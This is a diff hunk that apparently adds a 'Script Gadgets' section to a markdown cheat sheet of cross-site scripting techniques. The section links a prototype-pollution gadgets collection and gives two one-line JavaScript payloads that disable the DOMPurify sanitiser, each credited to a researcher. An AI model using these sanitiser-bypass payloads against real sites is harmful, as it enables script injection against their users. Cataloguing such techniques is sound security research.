@@ -433,6 +433,22 @@ Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-pare
 
 ---
 
+# With Script Gadgets 
 
-___
+Using Prorotype Pollution [PP Gadgets Repo](https://github.com/BlackFan/client-side-prototype-pollution#script-gadgets)
+
+---
+
+DOMPurify Remove [Parrot](https://twitter.com/parrot409)
+
+    delete DOMPurify.isSupported
+
+---
+
+DOMPurify Remove [hakatashi](https://hackmd.io/@hakatashi/HkgG02U4t)
+
+    delete document.implementation.__proto__.createHTMLDocument
+
+---
+
 ### Anything: @[RenwaX23](https://twitter.com/RenwaX23)
